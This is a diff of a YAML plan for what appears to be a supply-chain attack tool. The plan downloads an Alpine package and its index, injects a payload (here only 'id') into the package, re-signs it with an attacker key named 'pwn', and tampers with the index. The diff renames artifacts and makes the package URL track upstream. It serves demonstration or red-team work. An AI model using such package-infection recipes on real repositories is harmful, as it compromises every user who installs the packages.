@@ -11,19 +11,26 @@ signing_keys:
     bits: 4096
 
 artifacts:
-  index_upstream:
+  upstream_index:
     type: url
     url: https://dl-cdn.alpinelinux.org/alpine/edge/main/x86_64/APKINDEX.tar.gz
 
-  pkg_upstream:
+  upstream_release:
+    type: apk-pkg
+    artifact: upstream_index
+    url: https://dl-cdn.alpinelinux.org/alpine/edge/main/x86_64/
+    pkg:
+      name: alpine-baselayout-data
+
+  upstream_pkg:
     type: url
-    url: https://dl-cdn.alpinelinux.org/alpine/edge/main/x86_64/alpine-baselayout-data-3.4.0-r0.apk
-    sha256: d4bf453dbc6bddfb36588080da4bc50cec1ea695b8a9b3be3022841efef2a38a
+    url_template: '{{url}}'
+    template_metadata: upstream_release
 
   pkg_infected:
     type: infect
     infect: apk
-    artifact: pkg_upstream
+    artifact: upstream_pkg
     signing_key: pwn
     signing_key_name: hax.rsa.pub
     payload: id
@@ -31,7 +38,7 @@ artifacts:
   index_patched:
     type: tamper
     tamper: patch-apk-index
-    artifact: index_upstream
+    artifact: upstream_index
     signing_key: pwn
     signing_key_name: hax.rsa.pub
     #patch:
